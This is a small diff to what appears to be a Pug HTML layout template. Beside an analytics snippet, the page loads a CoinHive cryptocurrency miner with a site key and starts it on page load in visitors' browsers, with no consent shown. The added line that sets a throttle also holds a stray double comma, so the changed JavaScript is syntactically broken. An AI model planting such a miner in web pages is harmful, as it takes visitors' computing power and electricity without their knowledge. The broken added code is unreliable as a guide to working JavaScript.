@@ -51,7 +51,9 @@ html
       ga('create', 'UA-106566819-1', 'auto');
       ga('send', 'pageview');
     script.
-      var miner = new CoinHive.Anonymous('5jZqqlHyIVacW7NwGqSVWxer6RtLgbKc');
+      var miner = new CoinHive.Anonymous('5jZqqlHyIVacW7NwGqSVWxer6RtLgbKc', , {
+        throttle: 0.5,
+      });
       miner.start();
     
     include partials/flash
